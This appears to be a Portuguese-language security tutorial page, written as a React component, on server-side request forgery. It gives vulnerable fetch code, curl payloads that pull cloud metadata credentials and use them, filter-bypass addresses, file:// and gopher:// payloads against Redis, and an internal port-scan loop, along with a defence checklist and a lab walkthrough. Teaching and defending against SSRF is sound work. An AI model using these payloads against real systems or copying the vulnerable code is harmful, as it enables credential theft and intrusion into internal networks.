import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function SSRF() {
  return (
    <PageContainer
      title="SSRF — Server-Side Request Forgery"
      subtitle="O servidor faz requests HTTP para URL controlada pelo atacante. Caminho clássico até roubar credenciais cloud."
      difficulty="intermediario"
      timeToRead="14 min"
    >
      <h2>O bug</h2>
      <CodeBlock
        language="python"
        title="código vulnerável típico"
        code={`# Python (Flask)
@app.route('/preview')
def preview():
    url = request.args.get('url')
    r = requests.get(url, timeout=5)   # VULN
    return r.text

# Node.js (Express + axios)
app.get('/fetch', async (req, res) => {
  const r = await axios.get(req.query.url);   // VULN
  res.send(r.data);
});

# PHP (cURL)
$url = $_GET['url'];
$ch = curl_init($url);                  # VULN`}
      />

      <h2>Detecção básica</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "request normal — funciona",
            cmd: "curl 'https://app.local/preview?url=https://example.com'",
            out: `<html><head><title>Example Domain</title></head>...`,
            outType: "info",
          },
          {
            comment: "tentar um host interno (loopback)",
            cmd: "curl 'https://app.local/preview?url=http://127.0.0.1:8080'",
            out: `<h1>Internal Admin Panel</h1>
<form action="/login">...`,
            outType: "warning",
          },
          {
            comment: "porta interna comum",
            cmd: "curl 'https://app.local/preview?url=http://localhost:5432'",
            out: "(banner do PostgreSQL — confirma postgres rodando local)",
            outType: "warning",
          },
        ]}
      />

      <h2>Cloud metadata — o jackpot</h2>
      <p>
        AWS, GCP e Azure expõem credenciais temporárias para EC2/Compute em URLs internas
        previsíveis (<code>169.254.169.254</code>). Um SSRF que alcança esse endpoint
        rouba credenciais que dão acesso AO ambiente todo.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "AWS — listar IAM roles disponíveis",
            cmd: "curl 'https://app.local/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
            out: `ec2-app-role`,
            outType: "warning",
          },
          {
            cmd: "curl 'https://app.local/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-role'",
            out: `{
  "Code": "Success",
  "LastUpdated": "2026-04-03T13:21:42Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA1234567890ABCDEF",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "FwoGZXIvYXdzEDAaDPmO...(token gigante)...",
  "Expiration": "2026-04-03T19:42:18Z"
}`,
            outType: "error",
          },
          {
            comment: "agora você pode usar essas credenciais via aws-cli",
            cmd: `aws s3 ls --profile pwned`,
            out: `2024-01-15 09:11  empresa-prod-backups
2024-02-22 14:23  empresa-customer-data
2024-03-08 18:42  empresa-employee-files
2025-12-01 11:32  empresa-secrets-vault`,
            outType: "error",
          },
        ]}
      />

      <CommandTable
        title="Endpoints metadata por cloud"
        variations={[
          { cmd: "AWS IMDSv1", desc: "GET http://169.254.169.254/latest/meta-data/", output: "Sem auth. Roteiro padrão." },
          { cmd: "AWS IMDSv2", desc: "Precisa PUT com header X-aws-ec2-metadata-token.", output: "Defesa contra SSRF puro (mas não impede header injection)." },
          { cmd: "GCP", desc: "GET http://metadata.google.internal/ + Header 'Metadata-Flavor: Google'", output: "169.254.169.254/computeMetadata/v1/" },
          { cmd: "Azure", desc: "GET http://169.254.169.254/metadata/ + Header 'Metadata: true'", output: "?api-version=2021-02-01" },
          { cmd: "DigitalOcean", desc: "GET http://169.254.169.254/metadata/v1/", output: "Sem header." },
          { cmd: "Alibaba", desc: "GET http://100.100.100.200/latest/meta-data/", output: "IP diferente." },
          { cmd: "Kubernetes Pod", desc: "GET https://kubernetes.default.svc/api/", output: "Use service account JWT em /var/run/secrets/...." },
        ]}
      />

      <h2>Bypass — listas de bloqueio fracas</h2>
      <CommandTable
        title="Quando o app filtra '127.0.0.1'"
        variations={[
          { cmd: "0.0.0.0", desc: "Atalho para localhost.", output: "Funciona em quase tudo." },
          { cmd: "0", desc: "0 = 0.0.0.0 = localhost.", output: "http://0:80/" },
          { cmd: "::1 (IPv6 loopback)", desc: "Equivalente IPv6 de 127.0.0.1.", output: "http://[::1]/" },
          { cmd: "127.1 / 127.0.1", desc: "Forma curta de 127.0.0.1.", output: "Resolução clássica." },
          { cmd: "2130706433", desc: "127.0.0.1 em formato decimal.", output: "Calc: 127*2^24 + 1 = 2130706433" },
          { cmd: "0x7f000001", desc: "127.0.0.1 em hex.", output: "http://0x7f000001/" },
          { cmd: "0177.0.0.1", desc: "127 em octal.", output: "http://0177.0.0.1/" },
          { cmd: "localhost", desc: "DNS para 127.0.0.1.", output: "Funciona se filtra só IPs." },
          { cmd: "localhost.atacante.com", desc: "DNS rebinding (atacante controla DNS).", output: "Resolve 1ª vez para IP público, 2ª para 127.0.0.1." },
          { cmd: "127.0.0.1.nip.io", desc: "Wildcard DNS público (nip.io, sslip.io).", output: "Sem precisar setar DNS próprio." },
          { cmd: "@evil.com", desc: "Userinfo no URL.", output: "http://google.com@evil.com/ → vai para evil.com." },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "filtro: bloqueia '127' e 'localhost'",
            cmd: "curl 'https://app.local/preview?url=http://0.0.0.0:8080/admin'",
            out: "(bypass — funcionou)",
            outType: "warning",
          },
          {
            cmd: "curl 'https://app.local/preview?url=http://2130706433:8080/admin'",
            out: "(127.0.0.1 em decimal — mesmo resultado)",
            outType: "default",
          },
          {
            cmd: "curl 'https://app.local/preview?url=http://google.com@127.0.0.1:8080/admin'",
            out: "(parser fraco aceita o @)",
            outType: "default",
          },
        ]}
      />

      <h2>Esquemas alternativos de URL</h2>
      <CodeBlock
        language="text"
        title="esquemas que escapam validação 'só http'"
        code={`# file:// — lê arquivo do FS
file:///etc/passwd
file:///proc/self/environ

# gopher:// — bate em qualquer porta TCP em texto puro
# clássico para falar com Redis/Memcached/SMTP
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset...

# dict:// — dictionary protocol
dict://127.0.0.1:6379/info

# ldap:// — LDAP queries
ldap://127.0.0.1:389/

# ftp:// — FTP commands
ftp://anonymous:x@127.0.0.1:21/

# tftp:// — Trivial FTP
tftp://127.0.0.1:69/`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "ler arquivo via file://",
            cmd: "curl 'https://app.local/preview?url=file:///etc/passwd'",
            out: "root:x:0:0:root:/root:/bin/bash...",
            outType: "warning",
          },
          {
            comment: "atacar Redis via gopher:// (executa SET e GET)",
            cmd: "curl 'https://app.local/preview?url=gopher://127.0.0.1:6379/_INFO%0a'",
            out: `# Server
redis_version:7.2.4
os:Linux 5.15.0-83-generic x86_64
process_id:842
tcp_port:6379

# Memory
used_memory:1024576
maxmemory:0
[...]`,
            outType: "error",
          },
        ]}
      />

      <h2>Blind SSRF — sem retorno na response</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "use Burp Collaborator OU webhook.site",
            cmd: "(no Burp Pro: Collaborator → Copy to clipboard) https://abc123.oastify.com",
            out: "",
            outType: "muted",
          },
          {
            cmd: "curl 'https://app.local/preview?url=https://abc123.oastify.com/'",
            out: "(servidor não retorna nada)",
            outType: "default",
          },
          {
            comment: "no Burp Collaborator → poll: ",
            cmd: "(refresh)",
            out: `HTTP request from 200.150.10.42 (servidor da app.local)
GET / HTTP/1.1
Host: abc123.oastify.com
User-Agent: python-requests/2.31.0`,
            outType: "warning",
          },
          {
            comment: "ou serviço público gratuito",
            cmd: "curl https://webhook.site/token/abc/requests",
            out: "(mostra todos os hits)",
            outType: "info",
          },
        ]}
      />

      <h2>SSRF para escanear rede interna</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "fuzz de portas internas — diferenças de tamanho/tempo revelam",
            cmd: `for P in 22 80 443 3306 5432 6379 8080 9200; do
  TIME=$(curl -s -o /dev/null -w '%{time_total}' "https://app.local/preview?url=http://127.0.0.1:$P/")
  echo "porta $P → $TIME"
done`,
            out: `porta 22 → 0.012
porta 80 → 0.142     ← responde (devagar = HTTP)
porta 443 → 5.012    ← timeout = fechada
porta 3306 → 0.018
porta 5432 → 0.014
porta 6379 → 0.011   ← rápido = aberto
porta 8080 → 0.142   ← responde
porta 9200 → 0.018   ← rápido = aberto (Elasticsearch)`,
            outType: "warning",
          },
        ]}
      />

      <h2>Defesa</h2>
      <CodeBlock
        language="text"
        title="checklist anti-SSRF"
        code={`✓ Whitelist de domínios permitidos (não blacklist)
✓ Bloqueia toda a 169.254.0.0/16 (metadata + link-local)
✓ Bloqueia 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, ::1, fc00::/7
✓ Resolve DNS uma vez e valida o IP REAL antes de fazer request (evita rebinding)
✓ Use cliente HTTP que NÃO segue redirect (ou valida cada redirect)
✓ Aceita só esquemas http/https (rejeita file, gopher, dict, ftp...)
✓ Migre AWS para IMDSv2 (exige PUT + token)
✓ Saída pelo proxy/egress controlado, não direto da app
✓ Disable allow_url_fopen no PHP / não use requests sem timeout`}
      />

      <PracticeBox
        title="Explore SSRF no PortSwigger Lab"
        goal="Resolver o lab 'Basic SSRF against the local server' do PortSwigger Web Security Academy."
        steps={[
          "Acesse portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost.",
          "Abra o lab.",
          "No produto, capture o POST 'Check Stock' no Burp.",
          "Modifique stockApi para http://localhost/admin → vê painel admin interno.",
          "Use o painel para deletar usuário carlos.",
        ]}
        command={`# Estado inicial: POST /product/stock body stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D1%26storeId%3D1
#
# Modificar para:
POST /product/stock HTTP/2
Host: 0a8f00ee04a6...web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

stockApi=http://localhost/admin

# Resposta vai mostrar HTML do /admin
# Próximo: deletar carlos
stockApi=http://localhost/admin/delete?username=carlos`}
        expected={`HTTP/2 200 OK
Congratulations! You solved the lab.`}
        verify="O lab muda para 'Solved' no canto superior direito do painel PortSwigger."
      />

      <AlertBox type="danger" title="SSRF é HIGH/CRITICAL em qualquer cloud">
        Em ambientes AWS/GCP/Azure, qualquer SSRF é potencialmente CRITICAL porque permite
        roubar credenciais IAM. Sempre teste e reporte com PoC concreto (acesso ao metadata
        endpoint ou ao Redis interno, por exemplo).
      </AlertBox>
    </PageContainer>
  );
}
